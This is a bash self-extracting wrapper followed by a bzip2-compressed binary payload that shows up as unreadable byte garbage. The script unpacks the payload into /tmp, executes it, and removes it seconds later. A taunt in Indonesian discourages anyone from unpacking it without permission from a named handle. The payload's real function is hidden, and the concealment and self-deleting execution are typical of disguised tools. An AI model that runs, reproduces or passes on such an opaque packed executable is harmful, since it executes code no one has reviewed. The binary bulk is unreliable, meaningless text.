#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY̘b ���� ����������pD@  `
χ�F죮�����    )���F& Ѧ�@4�������L� �)��S��'�yF�=M  4 4   � �M4       2 �� 4� d  4  4  � ���AF��PɣCA�M�44 hѠ4   �$&�	꧲he4L55=G�M��3P~�(�CC�?*=AdI41�Z"F�LDD�4B��ְ_E{"+��L�נ�_�Sv�5k���$���U꟮�./!� �D6ڌ";��XrӢ�B8�~�_�c��^8k����bI��Y�X�ͅ�@�y�t����5�2�E��K�#��zފ���U?8v�,
Sۧf���HB�'�a(�&D����2�c�a�d$���E��OԔ��\����C����d��D���;C�c����q�A���&����ƬC}'��,�wߪ��kLbA*�a�������`��&P@p�~sc���3<���L{��PTduT��A3-�պIqu�E�� ۅ�M��[�s����0�p�4+��pƭU�����)��+�}�wo�n��\g��O���0mP�����GW���z��MӉR@A�ȹ�mB�#�YB�2`�)���Vn���k��sw�����uX�� 'ק�pv��n)��hn~�VƊe��|Ǽg�	�;�Ñ`!�q��MWF"���}w���	���J0��$d��&���I}L)�@�zJ1�U���b�#H��ë���qK��3�?��<C �aHa�a7D���猝� i�6�ZZ�P܁;:��?�xTA����*�!Ic�%*�
�V��h�Xt���T�B�WQ�r��KX0߿��Z8�30�ף�s��a��L;��e�	�C42�3�@�Hc��B��޴[
;�]��*��׳ߤ:ς|G�F� t�.���x�Nb��� 1��F����6U�3,|DҪ��l��^T� �.K���D|bA$H����E��"�a��-Ŭ�	��!lX\�������g9_}�]u�㖝>Y$��W��p'�La�����/p�k���V�͐��t=�v�Qk�8Hk�]� k��:M8c��hA�O����t6�Műk[ �𝟰�v�7#��懤�|�w��7��<� 7�|1���'{)N|��í���B��8��LT �$$$����K�ZN�e��	$P�K��<Դ�H��q}��A'i�"�@��̪:��J/�����U��:�Vq�o��n�Q�!Pi(�d�ąj\8ų�F�5��0�<hч)l����,1T+����0�0:�%qQ�+ǑV�8���~�}����Ue�U�ݤ�8�V�v,\� J��-�/1���<r�a�f[/�ͱ�~�m��0ܴr�@uk��0[�N�����,�����Oн��$#qe�O��`c� ݞ9���s�8�	}:t��"L�X�
H5JM6�K�V�qG� �C�AN�?�	�����f��%�z�ZD���/�^����v��n�'!`6�[�k��z���Y�(Ä�c��(��>*�X��i�o3�%���s~�%cu�$O�3*�*iA�a��ʹ�8"!�Ý
Al	�v�:K�[��h� 13�'jM���R��4 I�@��I�l�g�wpv z1�qSq��E,N���� ���=���!�K�c�G(�� ���'�)z�PК�MĆaꉙ��t'Dc����"�/�h�#aZ��0Q��!��< ��Ro{1w���+�v����2B�hj+�4&�;���ǫ���C���:��DC�X������j:�4�wt>9!v~�xZ�p����g9we��9�L�v�n��̣���i7�MRĵ��?C-]��O�Oq��������/+Mo�G�CΰL!�s���bӒ�6+����+����ч�B�Hͦ|��#G����t�_6��(hBO��� �zP!�,E9��{��/n,bR�&�e�~3�v/b"N�'��U�U����ط�QY�4y\C����x�\|����_T�=俻r���ՠn=�C������ �! �zb�������>[���S�Z��CZP�������T�Z��P���2q�<�!�\����\�8p�4:W��fw��(rp�Ķ������co�w2�������]^��`s w����^8�(k�l�;p5;�j�Ʒ�ea�o��h��iӕ78:/�Kd���T�(_ؐ�'+�6jMz�����&%��l�����h5d%�v��E�S#�����g𢡄P�f&��A ������ ��歇�҅)��F�$02�%r��e#��|�sI�e�z�>��ҁ-�4���)(���6��%"�\@�"P�A	
�tTU�AA�FJB���]��B@w2a�